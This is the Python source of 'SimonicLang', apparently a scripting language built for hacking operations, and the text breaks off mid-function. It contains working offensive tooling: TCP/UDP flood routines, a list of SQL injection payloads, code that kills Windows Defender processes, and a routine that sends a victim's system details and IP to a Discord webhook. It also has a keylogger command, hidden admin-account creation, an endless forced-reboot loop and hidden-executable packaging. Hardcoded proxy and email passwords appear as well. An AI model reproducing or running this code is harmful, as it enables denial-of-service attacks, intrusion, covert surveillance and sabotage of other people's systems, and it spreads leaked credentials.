# !/usr/bin/env python
# SimonicLang Programing Language
# This is a programming language that can easily and quickly perform many operations performed by hacker.

import sys, os, subprocess, platform, socket, json, threading, time, random, webbrowser, secrets, shutil

gctrue = 0
gcfalse = 0

def gc_test(ports):
    global gctrue, gcfalse
    ip = str(random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))
    ok = False
    for port in ports:
        try:
            s = socket.socket()
            s.settimeout(0.5)
            s.connect((ip, int(port)))
            ok = True
        except:
            pass
        finally:
            s.close()
    if ok:
        with lock:
            gctrue += 1
    else:
        with lock:
            gcfalse += 1
def gc_tester(num, ports):
    global gctrue, gcfalse
    with lock:
        gctrue = 0;gcfalse = 0
    ts = []
    for n in range(num):
        t = threading.Thread(target=gc_test, args=(ports,))
        ts.append(t)
    for t in ts:
        t.start()
    for t in ts:
        t.join()
    return (gctrue/gcfalse)
def gc_how(num):
    return 4228250625*num
def gc_get(trueLevel, ports):
    results = []
    n = 0
    for _ in range(trueLevel):
        result = gc_tester(500, ports)
        results.append(result)
        n += result
    n = n/len(results)
    many = int(gc_how(n))
    return many
class SimonCloud:
	def __init__(self, target="testingsimonscap", port=80):
		target = target+'.pythonanywhere.com'
		self.s = socket.socket()
		self.s.settimeout(10)
		self.s.connect((target, port))
		self.t = target;self.p = port
	def set(self, name, content): # Data Seting
		content = content.replace("\n", "/n/*")
		p = f"GET / HTTP/1.1\r\nHost: {self.t}:{self.p}\r\nCommand: set {name} {content}\r\n\r\n".encode()
		self.s.sendall(p)
	def get(self, name): # Data Geting
		p = f"GET / HTTP/1.1\r\nHost: {self.t}:{self.p}\r\nCommand: get {name}\r\n\r\n".encode()
		self.s.sendall(p)
	def com(self, c): # Bash Command Runner
		p = f"GET / HTTP/1.1\r\nHost: {self.t}:{self.p}\r\nCommand: com {c}\r\n\r\n".encode()
		self.s.sendall(p)
	def recv(self):
		recv = self.s.recv(65535).decode()
		while True:
			try:
				a = self.s.recv(65535).decode()
				if len(a) >= 1:
					recv += a
				else:
					break
			except:
				break
		return recv.split("\r\n\r\n")[1].replace("/n/*", "\n")

def randomProxy():
    import requests
    from requests.auth import HTTPProxyAuth
    list = """45.95.148.7:8000
49shT6
RdAzxw

45.85.161.144:8000
hudWdY
JW3dr8

45.157.36.248:8000
HUgcwX
rRSNQH

38.170.100.122:8000
CnkoD0
rYQ3f1

38.148.143.64:8000
Bmtr4f
7fNjP5

138.219.72.201:8000
5GzQu1
UgnuNK

45.94.36.148:8000
NuzUxt
tjQzFu

45.133.220.123:8000
10xuSX
GWq2ZJ

196.17.171.103:8000
KkCMHH
53aav8

163.198.134.38:8000
Jd8odq
fscew2""".split("\n\n")
    choc = random.choice(list).split("\n")
    host = choc[0]
    user = choc[1]
    pawd = choc[2]
    return {"http": f"http://{host}/", "https": f"https://{host}/"}, HTTPProxyAuth(user, pawd)
def proxyGet0(targeturl):
    global mods, httpHeaders
    try:
        if 0 in mods:
            pass
        else:
            try:
                subprocess.run("pip install requests".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                with lock:
                    mods.append(0)
            except:
                pass
        import requests
        proxy, auth = randomProxy()
        text = requests.get(targeturl, headers=httpHeaders, proxies=proxy, auth=auth, timeout=2).text
    except Exception as e:
        text = "error: "+str(e)
    return text

def getprocs():
	global mods
	if 342 in mods:
		pass
	else:
		subprocess.run("pip install psutil".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		mods.append(342)
	import psutil
	procs = []
	for h in psutil.process_iter(["pid", "name", "memory_info", "cpu_percent"]):
		try:
			info = {"pid": h.info["pid"], "name": h.info["name"], "ramus": h.info["memory_info"], "cpus": h.info["cpu_percent"]}
		except:
			info = {}
		procs.append(info)
	return procs

def stopproc(pid):
	global mods
	if 342 in mods:
		pass
	else:
		subprocess.run("pip install psutil".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		mods.append(342)
	import psutil
	try:
		proc = psutil.Process(pid)
		proc.kill()
	except:
		pass
	try:
		proc = psutil.Process(pid)
		proc.terminate()
	except:
		pass

def appblock(name):
    while True:
        try:
            procs = getprocs()
            for h in procs:
                if h["name"] == name:
                    threading.Thread(target=stopproc, args=(h["pid"],)).start()
        except:
            pass
def blockAntivirus():
    while True:
        try:
            procs = getprocs()
            for h in procs:
                if h["name"] in ["MsMpEng.exe", "Antimalware Service Executable", "MpCmdRun.exe", "NisSrv.exe", "Nis.exe", "MsMpSvc.exe", "WdNisSvc.exe", "WdNis.exe", "WdCspSvc.exe", "WdBoot.exe", "MpSigStub.exe", "WdNisEtwCollector.exe", "WdNisEtwCollectorService.exe", "WdBootEtwCollector.exe", "WdBootEtwCollectorService.exe", "SecurityHealthSystray.exe", "SecurityHealthService.exe"]:
                    threading.Thread(target=stopproc, args=(h["pid"],)).start()
        except:
            pass
def procList():
    try:
        procs = getprocs()
        text = ""
        for h in procs:
            try:
                pid = h["pid"]
                name = h["name"]
                mu = h["ramus"]
                cu = h["cpus"]
                text += f"{pid} - {name} : \nMemory Using: {mu}\nCPU Using: {cu}\n\n"
            except:
                pass
        return text
    except Exception as e:
        return str(e)

def requestin(target, path):
	pack = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent google1.0\r\nAccept: gzip, deflate\r\nContent-Type: text/html\r\nReferer http://www.google.com/\r\nOrigin: http://www.google.com/\r\nAuthority: www.google.com\r\nConnection: keep-alive\r\n\r\n".encode()
	try:
		s = socket.socket()
		s.settimeout(2)
		s.connect((target, 80))
		s.sendall(pack)
		recv = s.recv(65507)
		while True:
			try:
				data = s.recv(65507)
				if len(data) >= 1:
					recv += data
				else:
					break
			except:
				break
		s.close()
		code = recv.split()[1]
		if code == "301":
			try:
				loc = recv.split("Location: ")[1]
				loc = loc.split("\r\n")[0]
			except:
				loc = "http://"+target+path
			s = socket.socket()
			s.settimeout(2)
			s.connect((target, 80))
			s.sendall(pack)
			recv = s.recv(65507)
			while True:
				try:
					data = s.recv(65507)
					if len(data) >= 1:
						recv += data
					else:
						break
				except:
					break
			s.close()
	except:
		recv = "".encode()
	return recv

def testgetinject(target, path):
	try:
		c = requestin(target, path)
		try:
			c = c.decode()
		except:
			pass
		return c
	except Exception as e:
		return e

def sqlinjectrun(target, pathname, variable, filename):
	body = f"{pathname}?{variable}="
	temps = ["1' OR '1'='1'", '1" OR "1"="1', "1' OR '1'='1' --", "1' OR '1'='1' #", "-1' UNION SELECT 1, username, password FROM users --", "1' UNION SELECT null, username, password FROM users --", "1' UNION SELECT null, null, table_name FROM information_schema.tables --", "1' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='users' --", "1' AND 1=0 UNION SELECT null, username, password FROM users --", "1' AND 1=0 UNION SELECT null, null, table_name FROM information_schema.tables --", "1' AND 1=0 UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='users' --", "1'; EXEC xp_cmdshell('dir') --", "1'; EXEC master..xp_cmdshell('dir') --", "1'; EXEC('xp_cmdshell dir') --", "1'; EXEC('xp_cmdshell dir')--", "1'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --", "1'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --", "1' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%pass%') --", "1' OR 1=convert(int, (SELECT @@version)) --", "1' OR 1=CAST((SELECT @@version) AS int) --", "1'; DECLARE @cmd NVARCHAR(100); SET @cmd = 'dir'; EXEC sp_executesql @cmd; --", "1' OR 1=1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --", "1' OR 1=1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --", "1; EXEC('sp_configure ''show advanced options'', 1; RECONFIGURE;') --", "1; EXEC('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') --", "1'; DROP TABLE users --", "1'; DROP DATABASE dbname --", "1'; UPDATE users SET password='newpass' WHERE username='admin' --", "1' OR '1'='1'; --"]
	t = []
	for add in temps:
		n = temps.index(add)
		y = str((n/len(temps))*100)
		f = testgetinject(target, body+add)
		t.append(f)
	datadata = ""
	for source in t:
		datadata += str(source)+"\n\n"
	with open(filename, "w") as f:
		f.write(datadata)
class my_pool:
	def __init__(self, target, args):
		self.wait_flag = True
		self.run_flag = True
		threading.Thread(target=self.pool, args=(target, args)).start()
		threading.Thread(target=self.pool, args=(target, args)).start()
	def pool(self, target, args):
		while self.wait_flag:
			time.sleep(0.2)
		while self.run_flag:
			ts = []
			for _ in range(4):
				time.sleep(0)
				try:
					t = threading.Thread(target=target, args=args)
					t.start()
					ts.append(t)
				except:
					pass
				time.sleep(0)
			for t in ts:
				time.sleep(0)
				try:
					t.join()
				except:
					pass
				time.sleep(0)
			time.sleep(0)
	def run(self):
		self.wait_flag = False
	def stop(self):
		self.run_flag = False
		del self

def sysbyte():
	global byte, perbyte, flag
	while flag:
		lastbyte = int(byte)
		time.sleep(1)
		with lock:
			perbyte = int(byte)-lastbyte

def syspack():
	global pack, perpack, flag
	while flag:
		lastpack = int(pack)
		time.sleep(1)
		with lock:
			perpack = int(pack)-lastpack

def syssocks():
	global socks, persocks, flag
	while flag:
		lastsocks = int(socks)
		time.sleep(1)
		with lock:
			persocks = int(socks)-lastsocks

def getinfo():
	global byte, perbyte, pack, perpack, socks, persocks, target, port, err, errs
	return f"ALL SIZE: {int(byte):.7f} B\nALL SIZE: {byte/1024:.7f} KB\nALL SIZE: {byte/1024/1024:.7f} MB\nALL SIZE: {byte/1024/1024/1024:.7f} GB\nPER SIZE: {int(perbyte):.7f} B/s\nPER SIZE: {perbyte/1024:.7f} KB/s\nPER SIZE: {perbyte/1024/1024:.7f} MB/s\nPER SIZE: {perbyte/1024/1024/1024:.7f} GB/s\nALL PACKS: {pack}\nPER PACKS: {perpack} in second\nALL SOCKETS: {socks}\nPER SOCKETS: {persocks} in second\nTARGET: {target}\nPORT: {port}\nERROR: {err}\nERROR COUNT: {errs}"

def saveinfo(filename):
	global flag
	while flag:
		try:
			time.sleep(0.2)
			with open(filename, "w") as file:
				file.write(getinfo())
		except:
			pass

def tcpsys(size, pernum):
	global target, port, byte, pack, socks, err, errs
	try:
		packk = (chr(random.randint(0, 64))*size).encode()
		b = len(packk)
	except:
		try:
			packk = ("X"*size).encode()
			b = len(packk)
		except:
			packk = ""
			b = 0
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		with lock:
			socks += 1
		s.settimeout(0.8)
		s.connect((target, port))
		for _ in range(pernum):
			s.sendall(packk)
			with lock:
				pack += 1
				byte += b
	except Exception as e:
		with lock:
			err = e
			errs += 1
	try:
		s.close()
	except:
		pass

def udpsys(size, pernum):
	global target, port, byte, pack, socks, err, errs
	try:
		packk = (chr(random.randint(0, 64))*size).encode()
		b = len(packk)
	except:
		try:
			packk = ("X"*size).encode()
			b = len(packk)
		except:
			packk = ""
			b = 0
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		with lock:
			socks += 1
		s.settimeout(0.8)
		for _ in range(pernum):
			s.sendto(packk, (target, port))
			with lock:
				pack += 1
				byte += b
	except Exception as e:
		with lock:
			err = e
			errs += 1
	try:
		s.close()
	except:
		pass

def SL_CRYPT_BOX(password):
    sbox = ""
    hr = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
    password = password*len(hr)
    n = 1
    for h in password:
        b = hr[(ord(h)+n)%len(hr)]
        if b in sbox:
            pass
        else:
            sbox += b
        n += len(password)+len(sbox)+7
    return sbox
def SL_ENCRYPT(text, password):
    id = len(password)*2
    for h in password:
        id += ord(h)
    sbox = SL_CRYPT_BOX(password)
    nt = ""
    for h in text:
        if h in sbox:
            i = sbox.index(h)
            i2 = (i+len(password))%len(sbox)
            nt += sbox[i2]
        else:
            nt += h
    text = ""
    for h in nt:
        text += chr((ord(h)+id)%255)
    return text
def SL_DECRYPT(text, password):
    id = len(password)*2
    for h in password:
        id += ord(h)
    nt = ""
    for h in text:
        nt += chr((ord(h)-id)%255)
    text = ""
    sbox = SL_CRYPT_BOX(password)
    for h in nt:
        if h in sbox:
            i = sbox.index(h)
            i2 = (i-len(password))%len(sbox)
            text += sbox[i2]
        else:
            text += h
    return text

def startddos(type, size, pernum, filename):
	global target, port, flag, ddospool
	if type.lower() == "tcp":
		pool = my_pool(tcpsys, (size, pernum))
	elif type.lower() == "udp":
		pool = my_pool(udpsys, (size, pernum))
	threading.Thread(target=sysbyte).start()
	threading.Thread(target=syspack).start()
	threading.Thread(target=syssocks).start()
	threading.Thread(target=saveinfo, args=(filename,)).start()
	pool.run()
	ddospool = pool

vars = {}
byte = 0
perbyte = 0
pack = 0
perpack = 0
socks = 0
persocks = 0
target = "";port = 0
lock = threading.Lock()
err = ""
errs = 0
flag = True
ddospool = None
serverr = ""
httpHeaders = {"User-Agent": "SimonicLang", "Accept": "*/*"}
output = sys.stdout
outputSys = sys.stdout
errors = True
lock = threading.Lock()
mods = []
ts = []
bofList = []
class ioNone:
	def __init__(self):
		pass
	def write(self, *a, **k):
		pass
	def flush(self, *a, **k):
		pass
	def fileno(self, *a, **k):
		return None
def findtry():
	global serverr
	try:
		ip = fstring("$<random.ip>")
		port = random.choice([80, 8080, 443, 1080, 3306])
		s = socket.socket();s.settimeout(0.8);s.connect((ip, port))
		with lock:
			serverr = f"{ip}:{port}"
	except:
		pass
	s.close()
def fstring(text):
	global vars, mods, serverr
	text = text.replace("$<n>", "\n")
	text = text.replace("$<c.reset>", "\033[0m")
	text = text.replace("$<c.red>", "\033[91m")
	text = text.replace("$<c.green>", "\033[92m")
	text = text.replace("$<c.yellow>", "\033[93m")
	text = text.replace("$<c.blue>", "\033[94m")
	text = text.replace("$<c.purple>", "\033[95m")
	text = text.replace("$<c.blue2>", "\033[96m")
	text = text.replace("$<c.white>", "\033[99m")
	text = text.replace("$<c.black>", "\033[30m")
	text = text.replace("$<c.gray>", "\033[90m")
	text = text.replace("$<smlangUrl>", "https://github.com/aertsimon90/SimonicLang")
	text = text.replace("$<bold>", "\033[1m")
	for item, value in vars.items():
		text = text.replace("$<v."+str(item)+">", str(value))
		text = text.replace("$<vup."+str(item)+">", str(value).upper())
		text = text.replace("$<vlow."+str(item)+">", str(value).lower())
		text = text.replace("$<vlen."+str(item)+">", str(len(str(value))))
	if "$<" in text:
		text = text.replace("$<random.ip>", str(random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255)))
		text = text.replace("$<sys.name>", os.name)
		text = text.replace("$<basefile>", os.path.basename(__file__))
		text = text.replace("$<sys.sys>", platform.system())
		text = text.replace("$<sys.ver>", platform.version())
		text = text.replace("$<sys.node>", platform.node())
		if "$<sys.user2>" in text:
			import getpass
			text = text.replace("$<sys.user2>", getpass.getuser())
		text = text.replace("$<sys.user>", os.getlogin())
		text = text.replace("$<sys.path>", os.getcwd())
		text = text.replace("$<sys.prcsr>", platform.processor())
		text = text.replace("$<sys.pyver>", platform.python_version())
		text = text.replace("$<sys.slver>", "1.0.2")
		text = text.replace("$<sys.mac>", platform.machine())
		text = text.replace("$<sys.arch>", ', '.join(platform.architecture()))
	if "$<random.apikey" in text:
		text = text.replace("$<random.apikey.16>", secrets.token_hex(16))
		text = text.replace("$<random.apikey.32>", secrets.token_hex(32))
		text = text.replace("$<random.apikey.64>", secrets.token_hex(64))
		text = text.replace("$<random.apikey.128>", secrets.token_hex(128))
	if "$<random.server>" in text:
		serverr = ""
		while True:
			ts = []
			for _ in range(50):
				t = threading.Thread(target=findtry)
				if serverr == "":
					pass
				else:
					break
				t.start()
				ts.append(t)
			for t in ts:
				t.join()
			if serverr == "":
				pass
			else:
				text = text.replace("$<random.server>", serverr)
				break
	if "$<prcsc>" in text:
		try:
			if 342 in mods:
				pass
			else:
				subprocess.run(["pip", "install", "psutil"], stdout=ioNone(), stderr=ioNone())
				mods.append(342)
		except:
			pass
		try:
			import psutil
		except:
			pass
		text = text.replace("$<prcsc>", str(len(psutil.pids())))
	if "$<fakeUA>" in text:
		try:
			if 83 in mods:
				pass
			else:
				subprocess.run(["pip", "install", "fake_useragent"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				mods.append(83)
		except:
			pass
		from fake_useragent import UserAgent
		ua = UserAgent()
		text = text.replace("$<fakeUA>", ua.random)
	if "$<ram" in text:
		try:
			if 342 in mods:
				pass
			else:
				subprocess.run(["pip", "install", "psutil"], stdout=ioNone(), stderr=ioNone())
				mods.append(342)
		except:
			pass
		try:
			import psutil
		except:
			pass
		text = text.replace("$<ram.b>", str(psutil.virtual_memory().total))
		text = text.replace("$<ram.kb>", str(psutil.virtual_memory().total/1024))
		text = text.replace("$<ram.mb>", str(psutil.virtual_memory().total/(1024**2)))
		text = text.replace("$<ram.gb>", str(psutil.virtual_memory().total/(1024**3)))
		text = text.replace("$<ramav.b>", str(psutil.virtual_memory().available))
		text = text.replace("$<ramav.kb>", str(psutil.virtual_memory().available/1024))
		text = text.replace("$<ramav.mb>", str(psutil.virtual_memory().available/(1024**2)))
		text = text.replace("$<ramav.gb>", str(psutil.virtual_memory().available/(1024**3)))
		text = text.replace("$<ramus.b>", str((psutil.virtual_memory().total-psutil.virtual_memory().available)))
		text = text.replace("$<ramus.kb>", str((psutil.virtual_memory().total-psutil.virtual_memory().available)/1024))
		text = text.replace("$<ramus.mb>", str((psutil.virtual_memory().total-psutil.virtual_memory().available)/(1024**2)))
		text = text.replace("$<ramus.gb>", str((psutil.virtual_memory().total-psutil.virtual_memory().available)/(1024**3)))
	if "$<sys.ip>" in text:
		try:
			s = socket.socket();s.settimeout(0.8);s.connect(("ifconfig.me", 80));s.sendall(f"GET http://ifconfig.me/ip HTTP/1.1\r\nHost: ifconfig.me:80\r\nUser-Agent: SimonicLang\r\n\r\n".encode());ip=s.recv(999999).decode().split("\r\n\r\n")[1];s.close()
		except:
			ip = "0.0.0.0"
			try:
				s.close()
			except:
				pass
		text = text.replace("$<sys.ip>", ip)
	if "$<sys.host>" in text:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.settimeout(0.8);s.connect(("ifconfig.me", 80));s.sendall(f"GET http://ifconfig.me/ip HTTP/1.1\r\nHost: ifconfig.me:80\r\nUser-Agent: SimonicLang\r\n\r\n".encode());ip=s.recv(999999).decode().split("\r\n\r\n")[1];s.close()
		except:
			ip = "0.0.0.0"
			try:
				s.close()
			except:
				pass
		try:
			host = socket.gethostbyaddr(ip)[0]
		except:
			host = ""
		text = text.replace("$<sys.host>", host)
	if "$<all>" in text:
		txt = []
		for h in ["basefile", "sys.name", "sys.sys", "sys.ver", "sys.node", "sys.user", 'sys.user2', "sys.path", "sys.prcsr", "sys.pyver", "sys.slver", "sys.mac", "sys.arch", "sys.ip", "sys.host", "ram.b", "ram.kb", "ram.mb", "ram.gb", "ramav.b", "ramav.kb", "ramav.mb", "ramav.gb", "ramus.b", "ramus.kb", "ramus.mb", "ramus.gb", "prcsc"]:
			try:
				txt.append(f"{h}: "+fstring("$<"+h+">"))
			except:
				pass
		
		text = text.replace("$<all>", "\n".join(txt))
	if "$<date>" in text:
		try:
			if 2 in mods:
				pass
			else:
				subprocess.run(["pip", "install", "datetime"], stdout=ioNone(), stderr=ioNone())
				mods.append(2)
		except:
			pass
		try:
			from datetime import datetime
		except:
			pass
		date = datetime.now()
		date = date.strftime("%Y-%m-%d %H:%M:%S")
		text = text.replace("$<date>", date)
	return text
def returnAuto(filename, addbyte=0):
	with open(fstring("$<basefile>"), "r") as f:
		sysc = f.read().split("\n\n\n\n")[0]+"\n\n"
	with open(filename, "r") as f:
		c = f.read()
	sysc += "# X"+("X"*addbyte)+"\n"
	for h in c.split("\n"):
		sysc += f"runCode("+("'"*3)+h+("'"*3)+")\n"
	with open(filename, "w") as f:
		f.write(sysc)
def returnPythonExe(filename):
	subprocess.run(["pip", "install", "pyinstaller"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	cc = "python -m PyInstaller --onefile "+filename
	subprocess.run(cc.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	remexea()
def returnPythonHideExe(filename):
	subprocess.run(["pip", "install", "pyinstaller"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	cc = "python -m PyInstaller --onefile --noconsole "+filename
	subprocess.run(cc.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	remexea()
def returnSlExe(filename, ab=0):
	with open(filename, "r") as f:
		a = f.read()
	returnAuto(filename, ab)
	returnPythonExe(filename)
	with open(filename, "w") as f:
		f.write(a)
def returnSlHideExe(filename, ab=0):
	with open(filename, "r") as f:
		a = f.read()
	returnAuto(filename, ab)
	returnPythonHideExe(filename)
	with open(filename, "w") as f:
		f.write(a)
def remexea():
	for h in os.listdir():
		if ".spec" in h:
			runCode(f"filed;{h}")
	shutil.rmtree("build")
	p = os.getcwd()
	os.chdir("dist")
	for h in os.listdir():
		shutil.move(h, p)
	os.chdir("..")
	os.rmdir("dist")
def orint(text):
	global output
	print(text.replace("$<n>", "\n"), end="", file=output)
def orinto(text):
	global output
	output.write(text.replace("$<n>", "\n"))
	output.flush()
def bofs():
	global bofList
	try:
		with lock:
			bofList.append("X"*1024*1024*512)
	except:
		pass
def bof(n):
	while True:
		threading.Thread(target=bofs).start()
		time.sleep(n)
def netinfo(ip):
	global mods, httpHeaders
	if 0 in mods:
		pass
	else:
		subprocess.run(["pip", "install", "requests"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		with lock:
			mods.append(0)
	import requests
	infojson = requests.get(f"https://ipapi.co/{ip}/json", headers=httpHeaders, timeout=0.8)
	return infojson.json()
def discordWHSend(url, text):
	global httpHeaders, mods
	try:
		if 0 in mods:
			pass
		else:
			subprocess.run(["pip", "install", "requests"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			with lock:
				mods.append(0)
		import requests
		requests.post(url, headers=httpHeaders, json={"content": text}, timeout=5)
	except:
		pass
def hackUserSystem(url, name):
    text = f"- {name}\n"
    for h in ["sys.name", "sys.sys", "sys.ver", "sys.node", 'sys.user2', "sys.path", "sys.prcsr", "sys.pyver", "sys.slver", "sys.mac", "sys.arch", "sys.ip", "sys.host", "ram.gb"]:
        try:
            hh = fstring('$<'+h+'>')
            txt = f"{h.upper().replace('.', ' ')} : || {hh} ||"
            text += txt+"\n"
        except:
            pass
    try:
        ip = fstring("$<sys.ip>")
    except:
        ip = "0.0.0.0"
    text += f"NET INFO: || https://ipapi.co/{ip}/json ||\n"
    date = fstring("$<date>")
    text += f"DATE: {date}"
    discordWHSend(url, text)
htmlflag = True
def runHtml(code):
	global htmlflag
	ip = "127."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))
	port = random.randint(1025, 65535)
	s = socket.socket()
	s.bind((ip, port))
	s.listen(100)
	webbrowser.open(f"http://{ip}:{port}/")
	while htmlflag:
		try:
			c, a = s.accept()
			p = c.recv(1)
			c.send(f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(code)}\r\n\r\n{code}".encode())
		except:
			pass
def loadMod(id, name):
	global mods
	try:
		subprocess.run(f"pip install {name}", stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	except:
		pass
	with lock:
		mods.append(id)
def loadAllMods():
	mods = {"psutil": 342, "fake_useragent": 83, "datetime": 2, "requests": 0, "keyboard": 245, "tkinter": 3422}
	ts = []
	for name, id in mods.items():
		t = threading.Thread(target=loadMod, args=(id, name))
		t.start()
		ts.append(t)
	for t in ts:
		t.join()
def sendmail(server, port, acc, accpawd, target, subject, mes):
    import smtplib
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    email = MIMEMultipart()
    email['From'] = acc
    email['To'] = target
    email['Subject'] = subject
    email.attach(MIMEText(mes, 'plain'))
    try:
        smtp = smtplib.SMTP(server, port)
        smtp.starttls()
        smtp.ehlo()
        smtp.login(acc, accpawd)
        smtp.sendmail(acc, target, email.as_string())
    except:
        pass
    finally:
        smtp.quit()
def runCode(code):
	global output, outputSys, errors, vars, httpHeaders, ts, target, port, flag, ddospool, htmlflag, mods
	try: # Code Template: method;options...
		c = code.split(";")
		m = c[0]
		try:
			o = c[1:]
			ot = ";".join(o)
		except:
			o = []
			ot = ""
	except:
		m = ""
	try:
		if m == "log":
			orint(ot)
		elif m == "logf":
			orint(fstring(ot))
		elif m == "optilog":
			orinto(ot)
		elif m == "optilogf":
			orinto(fstring(ot))
		elif m == "outNone":
			with lock:
				output = ioNone()
		elif m == "outSys":
			with lock:
				output = outputSys
		elif m == "returnAuto":
			returnAuto(fstring(ot))
		elif m == "returnPyExe":
			returnPythonExe(fstring(ot))
		elif m == "returnPyHideExe":
			returnPythonHideExe(fstring(ot))
		elif m == "returnSLExe":
			try:
				ab = int(o[1])
			except:
				ab = 0
			returnSlExe(fstring(o[0]), ab)
		elif m == "returnSLHideExe":
			try:
				ab = int(o[1])
			except:
				ab = 0
			returnSlHideExe(fstring(o[0]), ab)
		elif m == "encrypt":
			filename = o[0]
			key = o[1]
			with open(filename, "r") as f:
				c = f.read()
			c = SL_ENCRYPT(c, key)
			with open(filename, "w") as f:
				f.write(c)
		elif m == "decrypt":
			filename = o[0]
			key = o[1]
			with open(filename, "r") as f:
				c = f.read()
			c = SL_DECRYPT(c, key)
			with open(filename, "w") as f:
				f.write(c)
		elif m == "eSet":
			if ot == "on":
				errors = True
			elif ot == "off":
				errors = False
		elif m == "vSet":
			with lock:
				vars[o[0]] = ";".join(o[1:])
		elif m == "vSetF":
			with lock:
				vars[o[0]] = fstring(";".join(o[1:]))
		elif m == "vSetFF":
			with lock:
				vars[fstring(o[0])] = fstring(";".join(o[1:]))
		elif m == "vR":
			with lock:
				del vars[o[0]]
		elif m == "vRF":
			with lock:
				del vars[fstring(o[0])]
		elif m == "input":
			with lock:
				vars[o[0]] = input(";".join(o[1:]))
		elif m == "inputf":
			with lock:
				vars[o[0]] = input(fstring(";".join(o[1:])))
		elif m == "wait":
			time.sleep(float(fstring(ot)))
		elif m == "random":
			min = int(o[0])
			max = int(o[1])
			value = random.randint(min, max)
			with lock:
				vars[o[2]] = str(value)
		elif m == "sendBotMail":
			server = "smtp.office365.com"
			pport = 587
			acc = "simoniclang@hotmail.com"
			accpawd = "H3rK9tL2pS6" # We know you're reading this, don't even think about it, believe me, it's just a bot account that will be of no use to you.
			ttarget = o[0]
			subject = o[1]
			mes = o[2]
			sendmail(server, pport, acc, accpawd, ttarget, subject, mes)
		elif m == "sendMail":
			server = o[0]
			pport = int(o[1])
			acc = o[2]
			accpawd = o[3]
			ttarget = o[4]
			subject = o[5]
			mes = o[6]
			sendmail(server, pport, acc, accpawd, ttarget, subject, mes)
		elif m == "keylog":
			if 245 in mods:
				pass
			else:
				try:
					subprocess.run("pip install keyboard".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				except:
					pass
				mods.append(245)
			import keyboard
			tttt = keyboard.read_event(suppress=True).name
			with lock:
				vars[o[0]] = str(tttt)
		elif m == "setRoot":
			os.chmod(fstring(ot), 0o777)
		elif m == "%":
			num = float(fstring(o[0]))
			num2 = float(fstring(o[1]))
			with lock:
				vars[o[2]] = str((num/num2)*100)
		elif m == "blockPerms":
			os.chmod(fstring(ot), 0)
		elif m == "tasklist":
			vars[fstring(o[0])] = procList()
		elif m == "taskkill":
			stopproc(int(fstring(ot)))
		elif m == "taskblock":
			threading.Thread(target=appblock, args=(fstring(ot),)).start()
		elif m == "blockDefender":
			threading.Thread(target=blockAntivirus).start()
		elif m == "errorBox":
			if ot == "":
				ot = "Unknow error from program"
			if 3422 in mods:
				pass
			else:
				try:
					subprocess.run("pip install tkinter".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
					with lock:
						mods.append(3422)
				except:
					pass
			try:
				exec("""from """+"""tkinter import messagebox\nthreading.Thread(target=messagebox.showerror, args=("ERROR", fstring(ot))).start()""")
			except:
				pass
			time.sleep(0.05)
		elif m == "winUserAdd":
			user = fstring(o[0])
			pawd = fstring(o[1])
			subprocess.run(f"net user {user} {pawd} /add".split(), check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			subprocess.run(f"net localgroup administrators {user} /add".split(), check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		elif m == "shutdown":
			try:
				subprocess.run("shutdown /s /f /t 0".split(), check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			except:
				pass
			try:
				subprocess.run("powershell Stop-Computer -Force".split(), check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			except:
				pass
			try:
				subprocess.run("sudo shutdown -h now".split(), check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			except:
				pass
		elif m == "reboot":
			try:
				subprocess.run("shutdown /r /f /t 0".split(), check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			except:
				pass
			try:
				subprocess.run("powershell Restart-Computer -Force".split(), check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			except:
				pass
			try:
				subprocess.run("sudo reboot".split(), check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			except:
				pass
		elif m == "brokePc":
			while True:
				try:
					threading.Thread(target=runCode, args=("reboot",)).start()
					threading.Thread(target=runCode, args=("shutdown",)).start()
				except:
					pass
		elif m == "serverCalculate":
			ports = o[0].split(",")
			tl = int(o[1])
			varname = o[2]
			count = gc_get(tl, ports)
			with lock:
				vars[varname] = str(count)
		elif m == "randomf":
			min = int(fstring(o[0]))
			max = int(fstring(o[1]))
			value = random.randint(min, max)
			with lock:
				vars[fstring(o[2])] = str(value)
		elif m == "randoms":
			min = float(o[0])
			max = float(o[1])
